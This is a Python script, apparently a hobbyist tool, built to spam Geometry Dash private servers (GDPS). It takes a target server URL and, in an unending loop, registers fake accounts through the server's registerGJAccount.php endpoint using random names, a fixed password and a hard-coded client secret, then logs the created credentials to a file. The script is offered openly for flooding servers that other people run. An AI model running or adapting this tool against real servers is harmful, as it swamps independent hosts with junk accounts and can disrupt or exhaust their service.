# Сделал Nyxaro (ex. KrikerGaming) для спама GDPS хостингов
# Импорты
import argparse
import requests
import os
import asyncio
import aiohttp
import random
import string
# Переменные
pref_plus = '[ + ] '
pref_minus = '[ - ] '
pref_vopros = '[ ? ] '
pref_vosk = '[ ! ] '
hello = '''
██╗  ██╗███████╗██╗     ██╗      ██████╗ 
██║  ██║██╔════╝██║     ██║     ██╔═══██╗
███████║█████╗  ██║     ██║     ██║   ██║
██╔══██║██╔══╝  ██║     ██║     ██║   ██║
██║  ██║███████╗███████╗███████╗╚██████╔╝
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ 
'''
spam = '''
███████╗██████╗  █████╗ ███╗   ███╗     ██████╗ ██████╗ ██████╗ ███████╗   
██╔════╝██╔══██╗██╔══██╗████╗ ████║    ██╔════╝ ██╔══██╗██╔══██╗██╔════╝  
███████╗██████╔╝███████║██╔████╔██║    ██║  ███╗██║  ██║██████╔╝███████╗    
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██║   ██║██║  ██║██╔═══╝ ╚════██║    
███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚██████╔╝██████╔╝██║     ███████║    
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚═════╝ ╚═════╝ ╚═╝     ╚══════╝     
                                                                                                    
'''
database = ""

# Функции
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
def check():
    with open("accounts.txt", "r") as f:
        for line in f:
            if ":" in line:
                username, password = line.strip().split(":")
                print("Username:", username)
                print("Password:", password)
                print("")
def spam_by_reference():
    clear_console()
    print(spam)
    print(pref_vosk + "Enter the GDPS BASE URL")
    print(pref_vosk + "(WITHOUT /accounts/registerGJAccount.php at the end)")
    database_fri = input(pref_vopros + "e.g. https://test.test/game/: ").strip()

    database_fri = database_fri.rstrip('/')
    suffix = '/accounts/registerGJAccount.php'
    if database_fri.endswith(suffix):
        database_fri = database_fri[:-len(suffix)]

    endpoint = database_fri + suffix
    print(pref_minus + "Checking endpoint: " + endpoint)
    try:
        resp = requests.get(endpoint, timeout=10)
    except requests.exceptions.RequestException as e:
        print(pref_minus + "Connection failed: " + str(e))
        return
    if resp.status_code == 404:
        print(pref_minus + "Endpoint not found (404). Wrong URL or registration is disabled.")
        return
    print(pref_plus + "Endpoint available (HTTP " + str(resp.status_code) + ")")
    asyncio.run(spam_by_reference_1(database_fri))
async def spam_by_reference_1(database_fri):
    while True:
        Letters = string.ascii_lowercase
        Email = ''.join(random.choice(Letters) for i in range(12))
        RandomString = str(random.randint(1, 9999999))
        UserName = RandomString
        password = "123456"
        userNameGDPS = UserName
        data = {
            'userName': UserName,
            'password': password,
            'email': RandomString + "m" + "@" + "gmail.com",
            'secret': "Wmfv3899gc9"
        }
        headers = {'User-Agent': '', 'Content-Type': 'application/x-www-form-urlencoded'}
        async with aiohttp.ClientSession() as session:
            RequestRegister = await session.post(database_fri + "/accounts/registerGJAccount.php",
                                                 data=data, headers=headers)
            Info1 = "The account was successfully registered with the name " + UserName
            f = open("accounts.txt", "a")
            f.write(f"{userNameGDPS}:{password}\n")
            f.close()
            print(pref_plus + Info1)
def dis():
    print(spam)
    print(pref_vosk + "Сделано с любовью из 2023 by nyxaro. <3")
    print(pref_vosk + "GitHub: https://github.com/nyxxaro")
    print(pref_vosk + "Telegram https://t.me/nyxaro")

def spam_tools():
    print(spam)
    print("[ 1 ] Spam GDPS Hosting (accounts)")
    print("[ 2 ] Check spam Acc")
    print("[ 3 ] Social network")
    print("")
    choice = input(pref_vopros + "Choose 1, 2 or 3: ")

    if choice == "1":
        spam_by_reference()
    elif choice == "2":
        check()
    elif choice == "3":
        dis()
    else:
        print(pref_vosk + "Wrong choice.")
        time.sleep(1)
        clear_console()
        spam_tools()


clear_console()
print(hello)

yes_or_no = input(pref_vosk + "Hey, buddy! Ready to use the function Spam GDPS. (Yes/No) ")

if yes_or_no == 'y' or yes_or_no == 'yes':
    clear_console()
    spam_tools()
else:
    clear_console()
    print("bye")
    exit()

